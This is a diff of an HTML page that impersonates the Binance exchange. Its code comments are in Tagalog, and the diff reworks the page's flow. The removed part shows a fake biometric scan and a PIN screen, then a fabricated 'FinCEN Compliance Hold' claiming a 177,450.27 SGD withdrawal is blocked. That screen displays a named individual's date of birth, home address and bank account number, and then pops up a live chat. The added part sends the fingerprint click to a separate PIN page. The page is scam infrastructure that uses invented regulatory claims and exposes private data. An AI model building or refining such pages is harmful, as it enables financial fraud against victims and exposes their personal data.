@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Binance Protocol Index</title>
+    <title>Binance Protocol Index - Biometric</title>
     <!-- Core Bootstrap 5 CDN Link -->
     <link href="https://jsdelivr.net" rel="stylesheet">
     <style>
@@ -43,86 +43,6 @@
             width: 100%;
         }
 
-        .term-input-field {
-            background-color: var(--term-panel-dark) !important;
-            border: 1px solid #474d57 !important;
-            color: #ffffff !important;
-            border-radius: 8px;
-            padding: 12px;
-            width: 100%;
-            font-size: 1rem;
-        }
-        .term-input-field:focus {
-            border-color: var(--term-accent-gold) !important;
-            box-shadow: none !important;
-            color: #ffffff !important;
-        }
-
-        .btn-term-gold {
-            background-color: var(--term-accent-gold) !important;
-            color: #000000 !important;
-            font-weight: 700;
-            border-radius: 8px;
-            border: none;
-            padding: 14px;
-            transition: all 0.2s ease;
-            text-decoration: none;
-            display: inline-block;
-        }
-        .btn-term-gold:hover {
-            background-color: var(--term-gold-hover) !important;
-            transform: translateY(-1px);
-            text-decoration: none;
-            color: #000000 !important;
-        }
-
-        .highlight-box {
-            background-color: rgba(240, 185, 11, 0.1);
-            border-left: 4px solid var(--term-accent-gold);
-            padding: 15px;
-            margin: 15px 0;
-            border-radius: 4px;
-        }
-
-        .error-highlight-box {
-            background-color: rgba(246, 70, 93, 0.1);
-            border-left: 4px solid var(--error-red);
-            padding: 20px;
-            margin: 20px 0;
-            border-radius: 8px;
-            text-align: left;
-        }
-
-        .code-details-block {
-            background-color: rgba(30, 35, 41, 0.8);
-            border: 1px solid var(--term-border);
-            padding: 20px;
-            border-radius: 8px;
-            margin: 15px 0;
-            font-family: 'Courier New', monospace;
-            font-size: 0.9rem;
-        }
-
-        .btn-dispute {
-            background-color: var(--error-red) !important;
-            color: #ffffff !important;
-            font-weight: 700;
-            border-radius: 8px;
-            border: none;
-            padding: 14px;
-            transition: all 0.2s ease;
-            cursor: pointer;
-            width: 100%;
-            text-transform: uppercase;
-            margin-top: 15px;
-            text-decoration: none;
-            display: block;
-        }
-        .btn-dispute:hover {
-            background-color: #e63550 !important;
-            color: #ffffff !important;
-        }
-
         .biometric-icon {
             font-size: 5rem;
             margin-bottom: 20px;
@@ -148,118 +68,21 @@
         <div class="row justify-content-center">
             <div class="col-md-8 col-lg-6">
 
-                <!-- 1️⃣ UNANG LALABAS PAG-OPEN: BIOMETRIC SCREEN -->
+                <!-- 1️⃣ UNANG LALABAS PAG-OPEN NG CRYPTO.HTML: BIOMETRIC SCREEN -->
                 <div id="layerBiometricVerification" class="app-flow-card text-center">
                     <h3 class="fw-bold mb-2 text-white">Biometric Authentication</h3>
                     <p style="color: var(--term-text-muted);" class="small mb-4">Place your finger on the scanner below to access network nodes</p>
-                    <div class="biometric-icon" onclick="executeBiometricVerification()">☝️</div>
+                    
+                    <!-- Lilipat sa panibagong page na pin-verification.html pagka-click ng finger -->
+                    <div class="biometric-icon" onclick="window.location.href='pin-verification.html'">☝️</div>
+                    
                     <div class="text-muted small">Click fingerprint icon to scan</div>
                 </div>
-
-                <!-- 2️⃣ IKALAWANG LALABAS: 6-DIGIT PIN CODE INPUT PANEL -->
-                <div id="layerPINVerification" class="app-flow-card text-center d-none">
-                    <h3 class="fw-bold mb-2 text-white">Security Validation</h3>
-                    <p style="color: var(--term-text-muted);" class="small mb-4">Enter 6-Digit Authorization PIN</p>
-                    <div class="mb-4 text-start">
-                        <input type="password" id="pinVerificationInput" class="term-input-field text-center" placeholder="******" maxlength="6">
-                    </div>
-                    <button class="btn-term-gold w-100 text-uppercase" onclick="executeTokenValidation()">Verify Credentials</button>
-                </div>
-                <!-- 3️⃣ IKATLONG LALABAS: PROCESSING AUTH SPINNER -->
-                <div id="layerLoadingWheel" class="app-flow-card d-none text-center py-5">
-                    <div class="spinner-border mb-3" style="width: 3.5rem; height: 3.5rem; color: var(--term-accent-gold);" role="status"></div>
-                    <h4 class="text-white">Processing Transaction Authorization...</h4>
-                    <p class="text-muted small mb-0">Validating security parameters and preparing asset transfer.</p>
-                </div>
-
-                <!-- 4️⃣ IKA-APAT NA LALABAS: KLTN WALLET RECORD AT FINCEN COMPLIANCE HOLD BLOCK -->
-                <div id="layerKYCFailed" class="app-flow-card d-none text-center">
-                    <div class="d-flex align-items-center gap-3 mb-3 justify-content-center">
-                        <h3 class="m-0" style="color: var(--error-red); font-size: 3rem;">✕</h3>
-                    </div>
-                    
-                    <!-- KLTN PROFILE DATA COMPONENT -->
-                    <div class="text-start border border-secondary p-3 rounded mb-4 small text-white-50">
-                        <div class="fw-bold text-white mb-2" style="color: var(--term-accent-gold) !important;">🔒 PROFILE ACCOUNT STATEMENT</div>
-                        <div><strong>Account Holder:</strong> Tan Kang Lin (KLTN)</div>
-                        <div><strong>D.O.B:</strong> 12/03/52</div>
-                        <div><strong>Address:</strong> 101 Bukit Batok West Avenue 6, #09-32</div>
-                        <div class="mt-2"><strong>Bank Linkage:</strong> DBS Bank</div>
-                        <div><strong>Ac # -</strong> 0010544080</div>
-                        <div><strong>Bank Address:</strong> DBS Asia Central, Marina Bay Financial Centre Tower 3, 12 Marina Boulevard, Singapore 018982</div>
-                        <div class="mt-2 fw-bold text-danger">Account Status: HOLD - INSUFFICIENT / INCOMPLETE DOCUMENTS REMEDIATION REQUIRED</div>
-                    </div>
-
-                    <h4 class="fw-bold m-0 text-white mb-3 text-start text-md-center">⚠️ Withdrawal Blocked: FinCEN Compliance Hold Active</h4>
-                    <hr class="border-secondary">
-                    
-                    <!-- FINCEN REGULATORY ALERT WARNING TEXT COMPONENT -->
-                    <div class="error-highlight-box text-white small">
-                        <p class="mb-3">Your withdrawal request of 177,450.27 SGD has been intercepted and placed on a federal regulatory hold under United States financial frameworks. As a global digital asset</p>
-                        <p class="mb-3">Platform, Binance strictly operates in full compliance with international financial authorities. During our automated international compliance sweep your wallet network</p>
-                     <p class="mb-3">Activity triggered a Tier-2 risk flag. In strict accordance with Binance's regulatory obligations under the US Department of the Treasury’s FinCEN (Financial Crimes Enforcement Network) mandates, the Bank Secrecy Act (BSA), and the SEC (Securities and Exchange Commission) cross-border digital asset guidelines, withdrawal access is restricted until identity verification is fully remediated.</p>
-                    </div>
-
-                    <div class="code-details-block text-start text-white-50">
-                        <p class="m-0 text-white fw-bold">Compliance & Transaction Audit:</p>
-                        <p class="m-0 mt-2">Platform Status: Binance Regulatory Compliance Protocol Active</p>
-                        <p class="m-0">Requested Amount: 177,450.27 SGD</p>
-                        <p class="m-0">Asset Origin: United States Liquidity Pool (US-East Clear)</p>
-                        <p class="m-0">Current Status: US Federal Regulatory Escrow / Restricted Liquidity</p>
-                        <p class="m-0">Audit Reference: TXN-US-SGD-99410A7X</p>
-                        <p class="m-0">System Flag: Code 403-FinCEN / Cross-Border Threshold Exceeded</p>
-                    </div>
-
-                    <div class="highlight-box text-white text-start small mt-3">
-                        <p class="m-0"><strong>Mandatory Action Required:</strong> The total amount of 177,450.27 SGD is secured in a US-regulated federal custodian vault. Binance is legally required to uphold these verification frameworks. To trigger an automated release and route the funds back to your destination account, you must instantly complete the advanced biometric verification.</p>
-                    </div>
-
-                    <p class="text-muted small mb-3 mt-4">Need to dispute this decision or resubmit documents?</p>
-                    <button class="btn-dispute" id="dispute-btn">🔴 Open Dispute & Chat with Support</button>
-                </div>
-
             </div>
         </div>
     </div>
 
-    <!-- 🔄 STEP-BY-STEP SIMULATION FLOW CONTROLLER -->
-    <script>
-        function switchState(hideElementId, showElementId) {
-            const hideTarget = document.getElementById(hideElementId);
-            const showTarget = document.getElementById(showElementId);
-            if (hideTarget && showTarget) {
-                hideTarget.classList.add('d-none');
-                showTarget.classList.remove('d-none');
-            }
-        }
-
-        // STEP 1 -> STEP 2: Biometric Fingerprint Display Link
-        function executeBiometricVerification() {
-            switchState('layerBiometricVerification', 'layerPINVerification');
-        }
-
-        // STEP 2 -> STEP 3 & 4: Token Audit & FinCEN Live Reveal
-        function executeTokenValidation() {
-            const secretCodeField = document.getElementById('pinVerificationInput');
-            if (secretCodeField && secretCodeField.value.trim() === "120352") {
-                switchState('layerPINVerification', 'layerLoadingWheel');
-                
-                // 3-second system verification interval timeout simulator
-                setTimeout(function() {
-                    switchState('layerLoadingWheel', 'layerKYCFailed');
-                    // PAG LABAS NG FINCEN COMPLIANCE SCREEN, KUSANG LILITAW AT MAG-POP UP ANG LIVE AGENT
-                    if (typeof Tawk_API.showWidget === 'function') {
-                        Tawk_API.showWidget();
-                        Tawk_API.maximize();
-                    }
-                }, 3000);
-            } else {
-                alert("Security validation failure: Input token parameter mismatched. (Use PIN: 120352)");
-            }
-        }
-    </script>
-
-    <!-- 🌐 TAWK.TO LIVE SUPPORT INTEGRATION ENGINE -->
+    <!-- 🌐 TAWK.TO LIVE SUPPORT INTEGRATION ENGINE (HIDDEN ON START) -->
     <script type="text/javascript">
     var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
     (function(){
@@ -273,18 +96,9 @@
 
     Tawk_API = Tawk_API || {};
     Tawk_API.onLoad = function(){
-        // Nakatago sa simula para hindi umepal sa biometric fingerprint window
+        // Nakatago muna rito dahil sa wallet hold screen pa ito dapat lilitaw
         Tawk_API.hideWidget();
-        
-        document.getElementById('dispute-btn').addEventListener('click', function(e) {
-            e.preventDefault();
-            Tawk_API.showWidget();
-            Tawk_API.maximize();
-        });
     };
-
-    Tawk_API.onChatMaximized = function(){ Tawk_API.showWidget(); };
-    Tawk_API.onChatMinimized = function(){ Tawk_API.hideWidget(); };
     </script>
 </body>
 </html>
